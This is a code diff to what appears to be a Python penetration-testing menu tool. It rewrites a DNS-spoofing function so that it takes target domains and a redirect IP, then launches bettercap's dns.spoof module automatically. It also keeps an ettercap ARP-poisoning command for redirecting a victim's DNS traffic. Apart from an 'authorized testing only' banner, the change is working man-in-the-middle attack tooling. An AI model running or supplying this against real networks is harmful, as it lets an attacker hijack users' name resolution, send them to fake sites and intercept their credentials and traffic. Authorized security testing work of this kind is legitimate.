@@ -135,28 +135,71 @@ def arp_spoof(target: Optional[str] = None, gateway: Optional[str] = None) -> bo
 @require_root
 def dns_spoof() -> None:
     """
-    DNS spoofing using ettercap or similar.
+    Perform DNS spoofing attack using Bettercap.
     """
+    logger = get_logger()
     header("DNS Spoofing")
     
     warning("FOR AUTHORIZED TESTING ONLY!")
     
-    if check_tool_installed('ettercap'):
-        info("Ettercap is available for DNS spoofing")
-        info("Create /etc/ettercap/etter.dns with entries like:")
-        print(f"  *.google.com A YOUR_IP")
-        print(f"  www.facebook.com A YOUR_IP")
-        info("Then run: sudo ettercap -T -q -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP// -P dns_spoof")
-    elif check_tool_installed('bettercap'):
-        info("Use bettercap for DNS spoofing:")
-        print(f"  sudo bettercap -iface eth0")
-        print(f"  set dns.spoof.domains example.com")
-        print(f"  set dns.spoof.address YOUR_IP")
-        print(f"  dns.spoof on")
-    else:
-        error("No DNS spoofing tools found")
-        info("Install ettercap: sudo apt install ettercap-text-only")
-        info("Or bettercap: sudo apt install bettercap")
+    # Check for Bettercap as primary tool
+    if not check_tool_installed('bettercap'):
+        error("Bettercap is not installed (required for active DNS spoofing)")
+        info("Install with: sudo apt install bettercap")
+        
+        if check_tool_installed('ettercap'):
+            info("\nEttercap is available. Manual usage recommended:")
+            print(f"  sudo ettercap -T -q -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP// -P dns_spoof")
+        
+        safe_press_enter()
+        return
+
+    # Get attack parameters
+    interface = safe_input(f"{Colors.OKGREEN}Network interface (default eth0): {Colors.ENDC}") or 'eth0'
+    domains = safe_input(f"{Colors.OKGREEN}Domains to spoof (comma separated, e.g., *.google.com,test.com): {Colors.ENDC}")
+    if not domains:
+        error("At least one domain is required")
+        safe_press_enter()
+        return
+        
+    spoof_ip = safe_input(f"{Colors.OKGREEN}Spoof resolution IP (your IP): {Colors.ENDC}")
+    if not spoof_ip:
+        error("Spoof IP required")
+        safe_press_enter()
+        return
+
+    info(f"Starting DNS spoof on {interface}...")
+    info(f"Redirecting {domains} to {spoof_ip}")
+    info("Press Ctrl+C to stop the attack")
+    
+    logger.tool_start("DNS Spoof", f"{domains} -> {spoof_ip}")
+
+    # Build Bettercap command
+    # -eval runs commands sequentially in bettercap
+    caplet_commands = [
+        f"set dns.spoof.domains {domains}",
+        f"set dns.spoof.address {spoof_ip}",
+        "dns.spoof on",
+        "events.clear",
+        "clear"
+    ]
+    
+    bettercap_cmd = [
+        'bettercap',
+        '-iface', interface,
+        '-eval', "; ".join(caplet_commands)
+    ]
+
+    try:
+        # Run bettercap interactively
+        subprocess.run(bettercap_cmd)
+        logger.tool_end("DNS Spoof", success=True)
+    except KeyboardInterrupt:
+        success("\nDNS Spoofing attack stopped.")
+        logger.tool_end("DNS Spoof", success=True)
+    except Exception as e:
+        error(f"Attack failed: {e}")
+        logger.tool_end("DNS Spoof", success=False)
     
     safe_press_enter()
 
